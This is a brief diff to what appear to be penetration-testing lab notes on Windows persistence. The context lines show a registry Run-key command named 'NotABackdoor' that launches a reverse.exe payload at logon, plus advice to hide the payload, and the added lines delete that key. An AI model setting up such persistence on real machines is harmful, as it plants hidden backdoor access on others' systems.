@@ -263,4 +263,6 @@ Place your payload and hide with attrib command if you want
 C:\Users\tcm\Downloads>reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"
 /v "NotABackdoor" /t REG_SZ /d "C:\Users\fcastle\Downloads\reverse.exe" /f
 
+#delete registry key
+reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "NotABackdoor" /f
 ```
